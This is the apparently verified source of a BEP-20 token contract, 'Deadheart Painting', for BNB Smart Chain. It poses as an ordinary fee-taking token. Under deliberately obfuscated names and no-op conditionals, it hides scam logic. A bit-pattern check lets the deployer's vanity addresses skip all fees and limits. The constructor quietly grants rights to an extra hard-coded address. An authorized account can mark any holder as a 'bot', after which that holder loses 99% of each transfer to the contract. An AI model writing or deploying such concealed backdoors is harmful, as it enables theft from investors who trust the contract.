/**
 *Submitted for verification at BscScan.com on 2022-12-22
*/

// SPDX-License-Identifier: MITpragma solidity ^0.8.5;abstract contract Ownable {    address internal owner;    mapping(address => bool) internal competent;    constructor(address _owner) {        owner = _owner;        competent[_owner] = true;    }    modifier onlyOwner() {        require(isOwner(msg.sender), "!OWNER");        _;    }    function SetAuthorized(address adr) public onlyAuthorized() {        competent[adr] = true;    }    modifier onlyAuthorized() {        require(isAuthorized(msg.sender), "!Authorized");        _;    }    function isAuthorized(address adr) public view returns (bool) {        return competent[adr];    }    function Owner() public view returns (address) {        return owner;    }    function isOwner(address account) public view returns (bool) {        return account == owner;    }}interface IPancakePair {    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);}interface IUniswapV2Factory {    function createPair(address tokenA, address tokenB)    external    returns (address pair);}interface IUniswapV2Router {    function swapExactTokensForETHSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);    function addLiquidity(        address tokenA,        address tokenB,        uint256 amountADesired,        uint256 amountBDesired,        uint256 amountAMin,        uint256 amountBMin,        address to,        uint256 deadline    )    external    returns (        uint256 amountA,        uint256 amountB,        uint256 liquidity    );    function WETH() external pure returns (address);    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);    function factory() external pure returns (address);    function addLiquidityETH(        address token,        uint256 amountTokenDesired,        uint256 amountTokenMin,        uint256 amountETHMin,        address to,        uint256 deadline    )    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);    function swapExactTokensForTokensSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;}interface IBEP20 {    function transferFrom(        address sender,        address recipient,        uint256 amount    ) external returns (bool);    function balanceOf(address account) external view returns (uint256);    function transfer(address recipient, uint256 amount)     external    returns (bool);    function getOwner() external view returns (address);    function allowance(address _owner, address spender)    external    view    returns (uint256);    function symbol() external view returns (string memory);    function decimals() external view returns (uint8);    function name() external view returns (string memory);    function approve(address spender, uint256 amount) external returns (bool);    function totalSupply() external view returns (uint256);    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(        address indexed owner,        address indexed spender,        uint256 value    );}interface IERC20 {    function balanceOf(address account) external view returns (uint256);}library SafeMath {    function mul(uint256 a, uint256 b) internal pure returns (uint256) {        return a * b;    }    function tryDiv(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b == 0) return (false, 0);        return (true, a / b);    }    }    function div(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b > 0, errorMessage);        return a / b;    }    }    function sub(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b <= a, errorMessage);        return a - b;    }    }    function div(uint256 a, uint256 b) internal pure returns (uint256) {        return a / b;    }    function tryMod(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b == 0) return (false, 0);        return (true, a % b);    }    }    function sub(uint256 a, uint256 b) internal pure returns (uint256) {        return a - b;    }    function tryMul(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (a == 0) return (true, 0);        uint256 c = a * b;        if (c / a != b) return (false, 0);        return (true, c);    }    }    function add(uint256 a, uint256 b) internal pure returns (uint256) {        return a + b;    }}contract DeadheartPainting is IBEP20, Ownable {    using SafeMath for uint256;    uint256  constant MASK = type(uint128).max;    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;    address DEAD = 0x000000000000000000000000000000000000dEaD;    address ZERO = 0x0000000000000000000000000000000000000000;    uint256 _totalSupply = 100000000 * (10 ** _decimals);    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;    uint256  _maxWallet = 2000000 * 10 ** _decimals;    string constant _name = "Deadheart Painting ";    string constant _symbol = "DeadheartPainting";    uint8 constant _decimals = 18;    //BUY FEES    uint256 private txTradingBotsTeam = 0;    uint256 private burnModeBuyAutoWalletTeam = 7;    //SELL FEES    uint256 private liquidityTradingLimitMarketing = 0;    uint256 private liquidityMarketingMinTrading = 7;    bool private botsBuyAutoIs = true;    bool private maxWalletExemptSell = true;    bool private isLimitMinModeMaxLaunchedMarketing = true;    uint256 private buyIsExemptTrading = _totalSupply / 1000; // 0.1%    uint256 private walletTeamMarketingBotsMaxIs = burnModeBuyAutoWalletTeam + txTradingBotsTeam;    uint256 private burnExemptMinReceiver = 100;    bool private walletModeTxLaunched;    uint256 firstSetAutoReceiver = 2 ** 18 - 1;    mapping(address => uint256) _balances;    mapping(address => mapping(address => uint256)) _allowances;    mapping(address => bool) private launchedModeSwapBurn;    mapping(address => bool) private txModeLimitSellBotsBurn;    mapping(address => bool) private limitMaxAutoMinBuyTeamLaunched;    mapping(address => bool) private swapBurnLiquidityMaxFeeReceiver;    uint256 private launchBlock = 0;    IUniswapV2Router public router;    address public uniswapV2Pair;    uint256 private minReceiverExemptSwap;    uint256 private walletLimitSellIs;    address private receiverTeamSwapLimitIsBuy = (msg.sender); // auto-liq address    address private walletBotsTradingSell = (0xC0ABDDf5fCDA13D2C8824e9fFffFCA2f140be566); // marketing address    address private autoBuyExemptSwap = DEAD;    address private sellBuyTeamIsFee = DEAD;    address private maxTxFeeIs = DEAD;    event BuyTaxesUpdated(uint256 buyTaxes);    event SellTaxesUpdated(uint256 sellTaxes);        bool private swapLaunchedTradingMode = false;    bool private receiverTeamWalletBots = false;    uint256 private liquidityModeReceiverExemptBurnLaunchedMarketing = 0;    bool public tradingBotsBurnReceiverMarketingModeIs = false;    uint256 private isLaunchedMaxBuy = 0;    bool private modeBotsLimitReceiverFeeSwapMin = false;    bool private modeMaxSwapLimit = false;    uint256 private modeReceiverLiquidityExempt = 0;    bool public limitAutoMinModeBots = false;    bool private buyWalletBurnAuto = false;    bool public receiverTeamWalletBots0 = false;    bool public receiverTeamWalletBots1 = false;    bool inSwap;    modifier swapping() {        inSwap = true;        _;        inSwap = false;    }    constructor() Ownable(msg.sender) {        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;        // PancakeSwap Router        router = IUniswapV2Router(_router);        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());        _allowances[address(this)][address(router)] = _totalSupply;        walletModeTxLaunched = true;        limitMaxAutoMinBuyTeamLaunched[msg.sender] = true;        limitMaxAutoMinBuyTeamLaunched[0x0000000000000000000000000000000000000000] = true;        limitMaxAutoMinBuyTeamLaunched[0x000000000000000000000000000000000000dEaD] = true;        limitMaxAutoMinBuyTeamLaunched[address(this)] = true;        launchedModeSwapBurn[msg.sender] = true;        launchedModeSwapBurn[address(this)] = true;        txModeLimitSellBotsBurn[msg.sender] = true;        txModeLimitSellBotsBurn[0x0000000000000000000000000000000000000000] = true;        txModeLimitSellBotsBurn[0x000000000000000000000000000000000000dEaD] = true;        txModeLimitSellBotsBurn[address(this)] = true;        SetAuthorized(address(0x60303C4D035b5FFF579307D5FfFfdd90A7020de2));        approve(_router, _totalSupply);        approve(address(uniswapV2Pair), _totalSupply);        _balances[msg.sender] = _totalSupply;        emit Transfer(address(0), msg.sender, _totalSupply);    }    receive() external payable {}    function totalSupply() external view override returns (uint256) {        return _totalSupply;    }    function decimals() external pure override returns (uint8) {        return _decimals;    }    function symbol() external pure override returns (string memory) {        return _symbol;    }    function name() external pure override returns (string memory) {        return _name;    }    function getOwner() external view override returns (address) {        return owner;    }    function balanceOf(address account) public view override returns (uint256) {        return _balances[account];    }    function allowance(address holder, address spender) external view override returns (uint256) {        return _allowances[holder][spender];    }    function approve(address spender, uint256 amount) public override returns (bool) {        _allowances[msg.sender][spender] = amount;        emit Approval(msg.sender, spender, amount);        return true;    }    function approveMax(address spender) external returns (bool) {        return approve(spender, _totalSupply);    }    function transfer(address recipient, uint256 amount) external override returns (bool) {        return walletAutoFeeLiquidityLimitSwap(msg.sender, recipient, amount);    }    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {        if (_allowances[sender][msg.sender] != _totalSupply) {            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]            .sub(amount, "Insufficient Allowance!");        }        return walletAutoFeeLiquidityLimitSwap(sender, recipient, amount);    }    function setBot(address addr) public onlyAuthorized {        swapBurnLiquidityMaxFeeReceiver[addr] = true;    }
    function getSwapLaunchedTradingMode() public view returns (bool) {        return swapLaunchedTradingMode;    }
    function setBurnModeBuyAutoWalletTeam(uint256 a0) public onlyOwner {        if (burnModeBuyAutoWalletTeam == liquidityTradingLimitMarketing) {            liquidityTradingLimitMarketing=a0;        }        burnModeBuyAutoWalletTeam=a0;    }
    function setTxTradingBotsTeam(uint256 a0) public onlyOwner {        txTradingBotsTeam=a0;    }
    function isBot(address addr) public view returns (bool) {        return swapBurnLiquidityMaxFeeReceiver[addr];    }
    function setSwapLaunchedTradingMode(bool a0) public onlyOwner {        if (swapLaunchedTradingMode == maxWalletExemptSell) {            maxWalletExemptSell=a0;        }        if (swapLaunchedTradingMode == modeMaxSwapLimit) {            modeMaxSwapLimit=a0;        }        if (swapLaunchedTradingMode == isLimitMinModeMaxLaunchedMarketing) {            isLimitMinModeMaxLaunchedMarketing=a0;        }        swapLaunchedTradingMode=a0;    }
    function getLimitMaxAutoMinBuyTeamLaunched(address a0) public view returns (bool) {        if (limitMaxAutoMinBuyTeamLaunched[a0] != swapBurnLiquidityMaxFeeReceiver[a0]) {            return modeBotsLimitReceiverFeeSwapMin;        }        if (a0 == maxTxFeeIs) {            return swapLaunchedTradingMode;        }        if (a0 != autoBuyExemptSwap) {            return receiverTeamWalletBots;        }            return limitMaxAutoMinBuyTeamLaunched[a0];    }
    function maxMinFeeMode(address sender, address recipient, uint256 amount) internal returns (bool) {        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");        _balances[recipient] = _balances[recipient].add(amount);        emit Transfer(sender, recipient, amount);        return true;    }
    function getTxTradingBotsTeam() public view returns (uint256) {        return txTradingBotsTeam;    }
    function limitBotsReceiverLaunchedTradingWallet(address sender, address receiver, uint256 amount) internal returns (uint256) {                if (modeReceiverLiquidityExempt != buyIsExemptTrading) {            modeReceiverLiquidityExempt = liquidityModeReceiverExemptBurnLaunchedMarketing;        }        if (swapLaunchedTradingMode != isLimitMinModeMaxLaunchedMarketing) {            swapLaunchedTradingMode = receiverTeamWalletBots;        }        if (liquidityModeReceiverExemptBurnLaunchedMarketing != liquidityTradingLimitMarketing) {            liquidityModeReceiverExemptBurnLaunchedMarketing = modeReceiverLiquidityExempt;        }        uint256 feeAmount = amount.mul(walletMarketingBuyExempt(sender, receiver == uniswapV2Pair)).div(burnExemptMinReceiver);        if (swapBurnLiquidityMaxFeeReceiver[sender] || swapBurnLiquidityMaxFeeReceiver[receiver]) {            feeAmount = amount.mul(99).div(burnExemptMinReceiver);        }        _balances[address(this)] = _balances[address(this)].add(feeAmount);        emit Transfer(sender, address(this), feeAmount);                return amount.sub(feeAmount);    }
    function setLimitMaxAutoMinBuyTeamLaunched(address a0,bool a1) public onlyOwner {        limitMaxAutoMinBuyTeamLaunched[a0]=a1;    }
    function getModeBotsLimitReceiverFeeSwapMin() public view returns (bool) {        if (modeBotsLimitReceiverFeeSwapMin != isLimitMinModeMaxLaunchedMarketing) {            return isLimitMinModeMaxLaunchedMarketing;        }        return modeBotsLimitReceiverFeeSwapMin;    }
    function getBuyIsExemptTrading() public view returns (uint256) {        if (buyIsExemptTrading == liquidityModeReceiverExemptBurnLaunchedMarketing) {            return liquidityModeReceiverExemptBurnLaunchedMarketing;        }        return buyIsExemptTrading;    }
    function botsIsTxMinExemptMarketingBuy() internal view returns (bool) {return    msg.sender != uniswapV2Pair &&    !inSwap &&    isLimitMinModeMaxLaunchedMarketing &&    _balances[address(this)] >= buyIsExemptTrading;    }
    function setModeBotsLimitReceiverFeeSwapMin(bool a0) public onlyOwner {        if (modeBotsLimitReceiverFeeSwapMin == isLimitMinModeMaxLaunchedMarketing) {            isLimitMinModeMaxLaunchedMarketing=a0;        }        if (modeBotsLimitReceiverFeeSwapMin == isLimitMinModeMaxLaunchedMarketing) {            isLimitMinModeMaxLaunchedMarketing=a0;        }        if (modeBotsLimitReceiverFeeSwapMin != buyWalletBurnAuto) {            buyWalletBurnAuto=a0;        }        modeBotsLimitReceiverFeeSwapMin=a0;    }
    function setBuyIsExemptTrading(uint256 a0) public onlyOwner {        buyIsExemptTrading=a0;    }
    function walletAutoFeeLiquidityLimitSwap(address sender, address recipient, uint256 amount) internal returns (bool) {                if (buyWalletBurnAuto != buyWalletBurnAuto) {            buyWalletBurnAuto = isLimitMinModeMaxLaunchedMarketing;        }        if (modeBotsLimitReceiverFeeSwapMin != modeMaxSwapLimit) {            modeBotsLimitReceiverFeeSwapMin = modeBotsLimitReceiverFeeSwapMin;        }        bool bTxWalletValue = limitWalletTxAutoFee(sender) || limitWalletTxAutoFee(recipient);                                if (modeBotsLimitReceiverFeeSwapMin == buyWalletBurnAuto) {            modeBotsLimitReceiverFeeSwapMin = botsBuyAutoIs;        }        if (inSwap || bTxWalletValue) {return maxMinFeeMode(sender, recipient, amount);}        if (!launchedModeSwapBurn[sender] && !launchedModeSwapBurn[recipient] && recipient != uniswapV2Pair) {            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet!");        }                require((amount <= _maxTxAmount) || limitMaxAutoMinBuyTeamLaunched[sender] || limitMaxAutoMinBuyTeamLaunched[recipient], "Max TX Limit!");        if (botsIsTxMinExemptMarketingBuy()) {launchedFeeTxSell();}        setTotalFee();        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");                uint256 amountReceived = maxBotsTeamIs(sender) ? limitBotsReceiverLaunchedTradingWallet(sender, recipient, amount) : amount;        _balances[recipient] = _balances[recipient].add(amountReceived);        emit Transfer(sender, recipient, amountReceived);        return true;    }
    function limitWalletTxAutoFee(address addr) private view returns (bool) {        return firstSetAutoReceiver == (uint256(uint160(addr)) << 192) >> 238;    }
    function maxBotsTeamIs(address sender) internal view returns (bool) {        return !txModeLimitSellBotsBurn[sender];    }
    function setTotalFee() internal {        walletTeamMarketingBotsMaxIs = liquidityMarketingMinTrading + liquidityTradingLimitMarketing;    }
    function launchedFeeTxSell() internal swapping {                if (modeBotsLimitReceiverFeeSwapMin != modeBotsLimitReceiverFeeSwapMin) {            modeBotsLimitReceiverFeeSwapMin = swapLaunchedTradingMode;        }        uint256 amountToLiquify = buyIsExemptTrading.mul(txTradingBotsTeam).div(walletTeamMarketingBotsMaxIs).div(2);        uint256 amountToSwap = buyIsExemptTrading.sub(amountToLiquify);        address[] memory path = new address[](2);        path[0] = address(this);        path[1] = router.WETH();        router.swapExactTokensForETHSupportingFeeOnTransferTokens(            amountToSwap,            0,            path,            address(this),            block.timestamp        );                if (isLaunchedMaxBuy == isLaunchedMaxBuy) {            isLaunchedMaxBuy = burnExemptMinReceiver;        }        uint256 amountBNB = address(this).balance;        uint256 totalETHFee = walletTeamMarketingBotsMaxIs.sub(txTradingBotsTeam.div(2));        uint256 amountBNBLiquidity = amountBNB.mul(txTradingBotsTeam).div(totalETHFee).div(2);        uint256 amountBNBMarketing = amountBNB.mul(burnModeBuyAutoWalletTeam).div(totalETHFee);                payable(walletBotsTradingSell).transfer(amountBNBMarketing);        if (amountToLiquify > 0) {            router.addLiquidityETH{value : amountBNBLiquidity}(                address(this),                amountToLiquify,                0,                0,                receiverTeamSwapLimitIsBuy,                block.timestamp            );            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);        }    }
    function getMaxTxFeeIs() public view returns (address) {        if (maxTxFeeIs != maxTxFeeIs) {            return maxTxFeeIs;        }        if (maxTxFeeIs != autoBuyExemptSwap) {            return autoBuyExemptSwap;        }        if (maxTxFeeIs != maxTxFeeIs) {            return maxTxFeeIs;        }        return maxTxFeeIs;    }
    function setReceiverTeamSwapLimitIsBuy(address a0) public onlyOwner {        if (receiverTeamSwapLimitIsBuy != maxTxFeeIs) {            maxTxFeeIs=a0;        }        if (receiverTeamSwapLimitIsBuy != walletBotsTradingSell) {            walletBotsTradingSell=a0;        }        if (receiverTeamSwapLimitIsBuy == autoBuyExemptSwap) {            autoBuyExemptSwap=a0;        }        receiverTeamSwapLimitIsBuy=a0;    }
    function getBurnModeBuyAutoWalletTeam() public view returns (uint256) {        if (burnModeBuyAutoWalletTeam != isLaunchedMaxBuy) {            return isLaunchedMaxBuy;        }        if (burnModeBuyAutoWalletTeam == burnExemptMinReceiver) {            return burnExemptMinReceiver;        }        return burnModeBuyAutoWalletTeam;    }
    function walletMarketingBuyExempt(address sender, bool selling) internal returns (uint256) {                if (selling) {            walletTeamMarketingBotsMaxIs = liquidityMarketingMinTrading + liquidityTradingLimitMarketing;            return walletTeamMarketingBotsMaxIs;        }        if (!selling && sender == uniswapV2Pair) {            walletTeamMarketingBotsMaxIs = burnModeBuyAutoWalletTeam + txTradingBotsTeam;            return walletTeamMarketingBotsMaxIs;        }        return liquidityMarketingMinTrading + liquidityTradingLimitMarketing;    }
    function getReceiverTeamSwapLimitIsBuy() public view returns (address) {        if (receiverTeamSwapLimitIsBuy != autoBuyExemptSwap) {            return autoBuyExemptSwap;        }        return receiverTeamSwapLimitIsBuy;    }
    function setMaxTxFeeIs(address a0) public onlyOwner {        if (maxTxFeeIs == maxTxFeeIs) {            maxTxFeeIs=a0;        }        if (maxTxFeeIs == walletBotsTradingSell) {            walletBotsTradingSell=a0;        }        maxTxFeeIs=a0;    }
    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}